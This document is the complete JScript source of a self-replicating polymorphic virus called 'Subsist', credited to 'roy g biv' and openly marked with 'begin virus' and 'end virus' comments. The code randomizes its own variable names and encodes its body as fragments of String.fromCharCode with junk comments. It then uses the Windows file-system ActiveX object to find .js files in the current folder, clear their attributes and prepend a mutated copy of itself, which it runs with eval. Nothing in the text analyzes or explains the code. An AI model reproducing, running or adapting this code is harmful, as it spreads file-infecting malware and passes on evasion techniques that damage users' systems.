//Subsist - roy g biv 10/3/10
varvirclr=new ActiveXObject("scripting.filesystemobject").opentextfile("subsist.js").readall();virb=varvirclr.search("var"+"all");varvirclr=varvirclr.substr(virb,varvirclr.search(/\/\*/)-virb-2).replace(/if\(0\)|\/\/0\r\n/g,"")
//begin virus
varall=Array("varall","vartind1","vartind2","vartind3","vartval1","vartstr1","vartstr2","varind1","varind2","varind3","varfragc","varfrag","varmode","varsname","varname","varename","varefrag","varbody","varpmode","varsel","varltr","varnum","varstr","procrandspc","procbool","procrandname","procrandcomm","procrandcomms","procrandcont");for(vartval1=0;vartval1<varall.length;++vartval1)varvirclr=varvirclr.replace(RegExp(varall[vartval1],"g"),procrandname());varfrag=Array();vartstr1=varvirclr;varfragc=0;with(Math){do{vartval1=round(random()*20)+20;if(vartval1>vartstr1.length)vartval1=vartstr1.length;varfrag[varfragc++]=vartval1;vartstr1=vartstr1.substr(vartval1)}while(vartstr1.length);varmode=Array();varsname=Array();varname=Array();varename=Array();for(varind1=0;varind1<varfragc;++varind1){varmode[varind1]=procbool();varsname[varind1]=procrandname();varname[varind1+1]=procrandname();if(varmode[varind1]){varename[varind1+1]=1;if(varind1)if(varmode[varind1-1])varname[varind1+1]=varname[varind1]}}varvirclr=varvirclr.replace(/varvirclr/g,varname[varfragc]);for(varind1=0;varind1<varfragc;++varind1){vartval1=varfrag[varind1];varfrag[varind1]="";for(vartind2=0;vartind2<vartval1;++vartind2)varfrag[varind1]+="+"+procrandcomm(1)+"String"+procrandcomm(1)+"."+procrandcomm(1)+"fromCharCode"+procrandcomm(1)+"("+procrandcomm(1)+varvirclr.charCodeAt(vartind2)+procrandcomm(1)+")"+procrandcomm(1);varfrag[varind1]=procrandcont(varfrag[varind1].substr(1));varvirclr=varvirclr.substr(vartval1)}varname[0]=procrandname();varefrag=Array();varbody="";varind3=0;do{if(procbool()&&!varename[varind1=round(random()*(varfragc+1))]){varename[varind1]=1;varbody+="\n"+procrandcomm(1)+varname[varind1]+procrandcomm(1)+"="+procrandcomm(1)+'""'+procrandcomms();varpmode=0}if(!varefrag[varind1=round(random()*varfragc)]){varefrag[varind1]=1;varbody+="\n"+procrandcomm(1)+"function"+procrandcomm(1)+varsname[varind1]+procrandcomm(1)+"("+(procbool()?procrandname():"")+procrandcomm(1)+")"+procrandcomms()+"{"+procrandcomms();if(varmode[varind1])varbody+="return"+procrandcomm(1);else varbody+=varname[varind1+1]+procrandcomm(1)+"="+procrandcomm(1)+varname[varind1]+procrandcomm(1)+"+"+procrandcomm(1);varbody+=varfrag[varind1]+procrandcomms()+"}"+procrandcomms();++varind2;varpmode=0}if(varind3<varfragc&&varename[varind3]&&(varmode[varind3]||varename[varind3+1])&&procbool()){if(varmode[varind3]){if(varpmode){varpmode=procbool();if(!varpmode)varbody+=procrandcomms()}if(!varpmode){varpmode=1;varbody+=varname[varind3+1]+procrandcomm(1)+"="+procrandcomm(1)+varname[varind3]}varbody+=procrandcomm(1)+"+"+procrandcomm(1)}else if(varpmode){varbody+=procrandcomms();varpmode=0}varbody+=varsname[varind3]+procrandcomm(1)+"("+procrandcomm(1)+")"+procrandcomm(1);if(!varmode[varind3])varbody+=procrandcomms();++varind3}}while((varind2<varfragc)||(varind3<varfragc))}varbody+=procrandcomms()+"eval"+procrandcomm(1)+"("+procrandcomm(1)+varname[varfragc]+procrandcomm(1)+")"+procrandcomms()
if(0)try{varind1=new ActiveXObject("scripting.filesystemobject");for(vartind1=new Enumerator(varind1.getfolder(".").files);!vartind1.atEnd();vartind1.moveNext())if(varind1.getextensionname(vartind2=vartind1.item()).toLowerCase()=="js")try{varind2=varind1.opentextfile(vartind2);vartstr1=varind2.read(1);if(vartstr1!="/")try{vartstr2=varind2.readall();vartval1=vartind2.attributes;vartind2.attributes=0;varind3=varind1.opentextfile(vartind2,2);varind3.write("//Subsist - roy g biv 10/3/10\n"+varbody+vartstr1+vartstr2);varind3.close();vartind2.attributes=vartval1}catch(vartval1){}varind2.close()}catch(vartval1){}}catch(vartval1){}//0
function procrandspc(){varltr="";vartind3=0;while(vartind3++<=Math.random()*5)varltr+=" ";return varltr}function procrandcomm(varsel){vartstr2=" ";if(procbool()){vartstr2=procrandspc()+(varsel?"/"+"*":"//")+procrandspc();for(vartind3=0;vartind3<=Math.random()*5;++vartind3){varltr=String.fromCharCode(Math.random()*95+32);if(varltr!="/")vartstr2+=varltr}if(varsel)vartstr2+="*/"+procrandspc()}return vartstr2}function procbool(){return Math.round(Math.random())}function procrandname(){vartstr1="";varltr=1;varnum=0;for(vartind1=0;vartind1<9;++vartind1){with(Math)vartstr1+=String.fromCharCode((random()*26+procbool()*32+65)*varltr+(random()*10+48)*varnum);varltr=procbool();varnum=varltr^1}return vartstr1}function procrandcomms(){vartstr1="";for(vartind1=0;vartind1<=Math.random()*5;++vartind1)vartstr1+=procrandcomm(procbool())+procrandspc()+"\n"+procrandspc();return vartstr1}function procrandcont(varstr){vartstr1="";do{varind2=varstr.search(/\+/);if(varind2>0){vartstr1+=varstr.substr(0,varind2+1);if(!Math.round(Math.random()*10))vartstr1+="\n";varstr=varstr.substr(varind2+1)}}while(varind2>0)return vartstr1+varstr}
/* end virus */
eval(varbody)